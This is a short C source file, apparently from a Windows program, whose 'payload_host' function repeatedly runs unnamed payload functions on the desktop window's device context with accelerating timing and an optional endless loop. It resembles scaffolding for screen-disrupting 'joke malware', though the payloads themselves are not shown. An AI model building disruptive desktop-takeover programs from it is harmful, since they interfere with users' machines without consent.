#include <payload.h>
#include <window.h>

#include <Windows.h>
#include <stdio.h> //

static void cicle(payload_t* p, window_t* window)
{    
    ((void (*)(window_t*))p->function)(window);
    Sleep(p->delay);

    p->delay -= p->accel;

    if (p->delay < p->min_delay)
        p->delay = p->min_delay;

    printf("Delay: ---%d---\n", p->delay);
}

void payload_host(void* pl)
{
    payload_t* p = (payload_t*) pl;

    window_t window;
    window.hwnd = GetDesktopWindow();
    window.hdc = GetWindowDC(window.hwnd);
    GetWindowRect(window.hwnd, &window.rect);

    Sleep(p->start_delay * 1000);

    if (p->cicles == 0)
    {
        for(;;)
            cicle(p, &window);
    }
    else
    {
        for (int i = 0; i < p->cicles; ++i) 
            cicle(p, &window);
    }
}